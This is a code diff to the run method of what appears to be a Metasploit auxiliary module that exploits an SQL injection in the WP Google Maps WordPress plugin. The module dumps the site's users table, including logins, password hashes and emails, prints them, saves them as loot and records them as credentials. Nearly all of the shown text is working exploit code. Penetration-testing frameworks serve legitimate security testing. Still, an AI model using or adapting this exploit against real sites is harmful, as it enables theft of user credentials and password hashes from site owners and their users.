@@ -60,36 +60,37 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-
-    credentials = ""
-
     print_status("#{peer} - Trying to retrieve the #{datastore['DB_PREFIX']}users table...")
 
     # Commas can't be used in the injection, so fetch all the columns
-    res = send_sql_request("* from #{datastore['DB_PREFIX']}users")
+    body = send_sql_request("* from #{datastore['DB_PREFIX']}users")
+    fail_with(Failure::UnexpectedReply, 'No response or unexpected status code in response') if body.nil?
 
-    if res == '[]'
-      print_error("#{peer} - Failed to retrieve the table #{datastore['DB_PREFIX']}users")
-    else
-      body = JSON.parse(res)
-      body.each do |user|
-        print_good("#{peer} - Found #{user['user_login']} #{user['user_pass']} #{user['user_email']}")
-        connection_details = {
-          module_fullname: self.fullname,
-          username: user['user_login'],
-          private_data: user['user_pass'],
-          private_type: :nonreplayable_hash,
-          status: Metasploit::Model::Login::Status::UNTRIED,
-          proof: user['user_email']
-        }
-        create_credential(connection_details)
-        credentials << "#{user['user_login']},#{user['user_pass']},#{user['user_email']}\n"
-      end
+    begin
+      body = JSON.parse(body)
+    rescue JSON::ParserError
+      fail_with(Failure::NotFound, 'Returned data is not in JSON format')
     end
 
-    unless credentials.empty?
-      loot = store_loot("wp_google_maps.json","application/json", rhost, res)
+    if body.empty?
+      print_error("#{peer} - Failed to retrieve the table #{datastore['DB_PREFIX']}users")
+    else
+      loot = store_loot("wp_google_maps.json","application/json", rhost, body.to_s)
       print_good("Credentials saved in: #{loot}")
+    end
+
+    body.each do |user|
+      print_good("#{peer} - Found #{user['user_login']} #{user['user_pass']} #{user['user_email']}")
+      connection_details = {
+        module_fullname: self.fullname,
+        username: user['user_login'],
+        private_data: user['user_pass'],
+        private_type: :nonreplayable_hash,
+        workspace_id: myworkspace_id,
+        status: Metasploit::Model::Login::Status::UNTRIED,
+        proof: user['user_email']
+      }.merge(service_details)
+      create_credential(connection_details)
     end
   end
 end
